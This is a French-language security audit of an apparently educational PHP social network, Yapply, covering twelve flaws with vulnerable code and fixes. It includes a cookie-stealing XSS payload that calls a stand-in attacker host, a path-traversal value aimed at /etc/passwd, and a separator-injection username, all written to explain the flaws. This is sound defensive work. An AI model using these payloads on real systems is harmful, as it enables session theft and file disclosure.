# Audit de sécurité de Yapply

> **Auteur de l'audit :** Rayane Graine
> **Date :** Juin 2026
> **Périmètre :** Application Yapply (réseau social PHP, version "avant sécurisation")
> **Méthode :** Revue manuelle du code source (white-box)

---

## Résumé exécutif

L'audit a identifié **12 failles de sécurité** réparties en :

- **5 failles critiques** (exécution de code, injection, auth cassée)
- **4 failles importantes** (XSS, CSRF, exposition de données)
- **3 failles modérées** (concurrence, validation, sessions)

L'application **ne doit pas être déployée en production** dans son état actuel.

---

## Failles critiques

### F-01 : Upload de fichiers non restreint (RCE possible)
**Sévérité :** Critique
**Fichier :** `app/post.php` (lignes 12-15)

```php
if (isset($_FILES['photo']) && $_FILES['photo']['error'] === 0) {
    $photo = basename($_FILES['photo']['name']);
    move_uploaded_file($_FILES['photo']['tmp_name'], DOSSIER_IMAGES . '/' . $photo);
}
```

**Problème :**
- Aucun contrôle d'extension
- Aucun contrôle de type MIME
- Aucun contrôle de taille
- Le nom du fichier est contrôlé par l'utilisateur

**Impact :** Un attaquant peut uploader un fichier `shell.php` et l'exécuter en accédant à `data/images/shell.php`, d'où une **prise de contrôle complète du serveur**.

**Correction :**
- Vérifier l'extension (whitelist : jpg, png, gif, webp)
- Vérifier le type MIME réel avec `finfo`
- Limiter la taille (ex: 4 Mo max)
- Renommer le fichier avec un hash aléatoire
- Bloquer l'exécution PHP dans `data/images/` via `.htaccess`

---

### F-02 : Mots de passe stockés en clair
**Sévérité :** Critique
**Fichier :** `app/inscription_traitement.php` (ligne 32)

```php
$nouvelleLigne = "$user;$password;$password_conf;$mail;$prenom;$nom\n";
file_put_contents(FICHIER_COMPTES, $nouvelleLigne, FILE_APPEND);
```

**Problème :** Les mots de passe sont écrits en clair dans `comptes.txt`.

**Impact :** Si le fichier fuite (backup, accès web, compromission serveur), **tous les comptes sont compromis**. De plus, beaucoup d'utilisateurs réutilisent leurs mots de passe, ce qui propage la fuite à d'autres sites.

**Correction :**
```php
$hash = password_hash($password, PASSWORD_DEFAULT);
$nouvelleLigne = "$user;$hash;$mail;$prenom;$nom\n";
```
Et à la connexion :
```php
if (password_verify($password_saisi, $hash_stocke)) { /* OK */ }
```

---

### F-03 : Système de session cassé (fichier partagé)
**Sévérité :** Critique
**Fichier :** `src/config.php`, `app/connexion_traitement.php`

```php
define('FICHIER_SESSION', DOSSIER_DONNEES . '/session.txt');
// ...
file_put_contents(FICHIER_SESSION, $ligneCompte . "\n");
```

**Problème :** Un **seul fichier global** `session.txt` stocke l'utilisateur connecté. Si deux personnes se connectent en même temps, la dernière écrase la première, et tout le monde est connecté en tant que la même personne.

**Impact :** Aucune isolation entre utilisateurs. C'est une **authentification cassée** au sens OWASP.

**Correction :** Utiliser les sessions natives PHP :
```php
session_start();
$_SESSION['user'] = $username;
```

---

### F-04 : Injection de séparateur (Data corruption)
**Sévérité :** Critique
**Fichier :** `app/inscription_traitement.php`

```php
$nouvelleLigne = "$user;$password;$password_conf;$mail;$prenom;$nom\n";
```

**Problème :** Aucune vérification que les champs ne contiennent pas le séparateur `;` ou `\n`. Un attaquant peut s'inscrire avec un pseudo comme `attaquant;motdepasse_admin;...` et corrompre toute la base.

**Impact :** Possibilité d'injecter de fausses lignes, de se créer un compte admin fictif, de casser le parsing des autres comptes.

**Correction :**
- Whitelist de caractères autorisés (`[a-zA-Z0-9_-]`)
- Échapper ou rejeter `;` et `\n` dans tous les champs

---

### F-05 : Données sensibles dans la racine web
**Sévérité :** Critique
**Fichier :** `src/config.php`

```php
define('DOSSIER_DONNEES', RACINE . '/data');
```

**Problème :** Le dossier `data/` contenant les mots de passe est dans la racine web. Accessible via `http://site/data/comptes.txt`.

**Impact :** N'importe qui sur internet peut télécharger la liste des comptes.

**Correction :**
- Placer `data/` **hors** de la racine web (ex: `/var/www/yapply_data/`)
- Ou bloquer l'accès via `.htaccess` :
  ```apache
  <Directory data>
      Deny from all
  </Directory>
  ```

---

## Failles importantes

### F-06 : XSS stocké (Cross-Site Scripting)
**Sévérité :** Importante
**Fichiers :** `app/profil.php`, `app/accueil.php`, `app/message.php`

```php
echo "<p><strong>Prénom :</strong> " . ($data[4] ?? '') . "</p>";
echo "<div class='message $classe'><strong>$expediteur :</strong> $texte</div>";
echo "<div class='bio'><h2>Bio :</h2><br>" . $bio . "</div>";
```

**Problème :** Aucun `htmlspecialchars` sur les données utilisateur affichées (bio, posts, messages, prénoms).

**Impact :** Un utilisateur peut publier une bio comme `<script>fetch('http://attaquant.com?c='+document.cookie)</script>`, ce qui permet de voler les sessions de tous les visiteurs.

**Correction :** Échapper systématiquement avec :
```php
echo "<p>" . htmlspecialchars($bio, ENT_QUOTES, 'UTF-8') . "</p>";
```

---

### F-07 : Absence totale de protection CSRF
**Sévérité :** Importante
**Fichiers :** Toutes les actions POST (`post.php`, `like.php`, `commentaire.php`, `amis.php`, etc.)

**Problème :** Aucun jeton CSRF. Un site malveillant peut faire poster, liker, ajouter des amis au nom de la victime via un formulaire caché.

**Impact :** Actions effectuées à l'insu de l'utilisateur (poster du spam, supprimer des amis, etc.).

**Correction :** Générer un token aléatoire à la connexion, l'inclure dans tous les formulaires, le vérifier côté serveur :
```php
$_SESSION['csrf'] = bin2hex(random_bytes(32));
// Dans le formulaire : <input type="hidden" name="csrf" value="...">
// Au traitement : if (!hash_equals($_SESSION['csrf'], $_POST['csrf'])) die;
```

---

### F-08 : Path Traversal dans la messagerie
**Sévérité :** Importante
**Fichier :** `app/message.php`

```php
$autre = $_POST['avec'] ?? '';
$f1 = DOSSIER_MESSAGES . "/{$current_username}_{$autre}.txt";
```

**Problème :** `$autre` vient directement du POST sans validation. Un attaquant peut envoyer `avec=../../../../etc/passwd` ou `avec=../comptes`, et ainsi lire ou écrire des fichiers arbitraires.

**Impact :** Lecture du fichier `comptes.txt`, écrasement de fichiers sensibles, déni de service.

**Correction :** Whitelist de caractères :
```php
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $autre)) {
    header('Location: discussion.php'); exit;
}
```

---

### F-09 : Vérification d'unicité incomplète
**Sévérité :** Importante
**Fichier :** `app/inscription_traitement.php`

```php
foreach (file(FICHIER_COMPTES, ...) as $ligne) {
    // ...
    if ($pseudoPris && $mailPris) { ...; break; }
    if ($mailPris)                { ...; break; }
    if ($pseudoPris)              { ...; break; }
}
```

**Problème :** Le `break` stoppe à la première ligne contenant un conflit, mais l'unicité de l'email n'est pas vérifiée sur toutes les lignes. Bug logique aussi : si la première ligne matche le pseudo mais une autre ligne matche le mail, on ne le détecte pas.

**Impact :** Doublons de mails possibles, et donc un comportement imprévisible à la connexion.

**Correction :** Parcourir toute la liste, accumuler les résultats, puis décider à la fin.

---

## Failles modérées

### F-10 : Pas de protection contre la concurrence (race conditions)
**Sévérité :** Modérée
**Fichiers :** `app/like.php`, `app/post.php`, `app/commentaire.php`

```php
$lignes = file(FICHIER_POSTS, FILE_IGNORE_NEW_LINES);
// ... modifications ...
file_put_contents(FICHIER_POSTS, implode("\n", $lignes) . "\n");
```

**Problème :** Lecture puis écriture sans verrou. Si deux utilisateurs likent en même temps, l'un des likes peut être perdu.

**Impact :** Corruption des compteurs, pertes de commentaires.

**Correction :** Utiliser `flock()` :
```php
$fp = fopen(FICHIER_POSTS, 'r+');
flock($fp, LOCK_EX);
// lecture + écriture
flock($fp, LOCK_UN);
fclose($fp);
```

---

### F-11 : Validation insuffisante du mot de passe
**Sévérité :** Modérée
**Fichier :** `app/inscription_traitement.php`

```php
if (strlen($password) < 6) { $erreurs[] = "..."; }
```

**Problème :** Seule la longueur minimale est vérifiée. Pas de complexité requise (majuscule, chiffre, etc.), pas de longueur maximale.

**Impact :** Mots de passe faibles type `123456` acceptés.

**Correction :**
```php
if (strlen($password) < 8 || strlen($password) > 72) { /* err */ }
if (!preg_match('/[a-z]/', $password)) { /* err */ }
if (!preg_match('/[A-Z]/', $password)) { /* err */ }
if (!preg_match('/[0-9]/', $password)) { /* err */ }
```

---

### F-12 : Notifications sans validation
**Sévérité :** Modérée
**Fichier :** `app/post.php`, `app/like.php`, `app/commentaire.php`

```php
foreach (scandir(DOSSIER_NOTIFS) as $f) {
    if ($f[0] === '.' || $f === $username . '.txt') { continue; }
    file_put_contents(DOSSIER_NOTIFS . '/' . $f, "...", FILE_APPEND);
}
```

**Problème :** Le code écrit dans **chaque fichier** du dossier notifs, sans vérifier que ce sont bien des fichiers `.txt`. Combiné à un upload arbitraire (F-01) ou un path traversal, c'est exploitable.

**Impact :** Possible écriture dans des fichiers non prévus si le dossier est pollué.

**Correction :** Filtrer les noms de fichiers :
```php
if (!preg_match('/^[a-zA-Z0-9_-]+\.txt$/', $f)) continue;
```

---

## Tableau récapitulatif

| ID | Faille | Sévérité | Fichier principal |
|----|--------|----------|-------------------|
| F-01 | Upload non restreint (RCE) | Critique | `post.php` |
| F-02 | Mots de passe en clair | Critique | `inscription_traitement.php` |
| F-03 | Sessions cassées | Critique | `config.php` |
| F-04 | Injection de séparateur | Critique | `inscription_traitement.php` |
| F-05 | `data/` exposé sur le web | Critique | Structure du projet |
| F-06 | XSS stocké | Importante | Plusieurs |
| F-07 | Pas de CSRF | Importante | Tous les POST |
| F-08 | Path Traversal | Importante | `message.php` |
| F-09 | Unicité incomplète | Importante | `inscription_traitement.php` |
| F-10 | Race conditions | Modérée | `like.php`, `post.php` |
| F-11 | Mot de passe faible | Modérée | `inscription_traitement.php` |
| F-12 | Notifs sans filtre | Modérée | `post.php`, `like.php` |

---

## Plan de remédiation recommandé

**Priorité 1 (à corriger immédiatement)** : F-02, F-03, F-05. Objectif : une authentification de base sécurisée, sans laquelle rien d'autre ne tient.

**Priorité 2** : F-01, F-04, F-08. Failles d'exécution de code et de corruption de données.

**Priorité 3** : F-06, F-07. Protection des utilisateurs contre les attaques d'autres utilisateurs.

**Priorité 4** : F-09, F-10, F-11, F-12. Robustesse et hygiène.

---

## Conclusion

Yapply est un projet pédagogique cohérent avec son objectif initial (apprentissage HTML/CSS/PHP sans framework). Toutefois, **dans sa forme actuelle il ne doit pas être déployé**.

La bonne nouvelle : les corrections sont **toutes documentées** dans la communauté PHP, et la fonction `password_hash()` + les sessions natives PHP résolvent à elles seules trois des cinq failles critiques. Un projet de version sécurisée est donc parfaitement réalisable.

---

## Références

- OWASP Top 10 (2021) : https://owasp.org/Top10/
- PHP Security Cheatsheet : https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html
- CWE-79 (XSS), CWE-352 (CSRF), CWE-434 (Upload), CWE-22 (Path Traversal)
